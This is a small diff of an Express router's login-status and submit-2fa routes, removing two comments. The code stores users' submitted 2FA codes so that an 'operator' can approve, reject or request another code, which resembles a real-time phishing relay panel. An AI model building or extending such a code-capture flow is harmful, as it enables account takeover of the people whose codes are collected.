@@ -63,7 +63,6 @@ router.get('/login-status', function (req, res) {
 
     store.sweepExpired();
 
-    // Include 2fa_type and request_id when status is '2fa' so the FE can submit the code
     const payload = { status: rec.status };
     if (rec.status === '2fa') {
         payload.two_fa_type = rec.twoFactorType || 'email';
@@ -96,7 +95,6 @@ router.post('/submit-2fa', function (req, res) {
         return res.status(404).json({ error: 'Request expired' });
     }
 
-    // Store code, mark pending again so operator can approve/reject/2fa again
     rec.twoFactorCode = code;
     rec.status = 'pending';
 
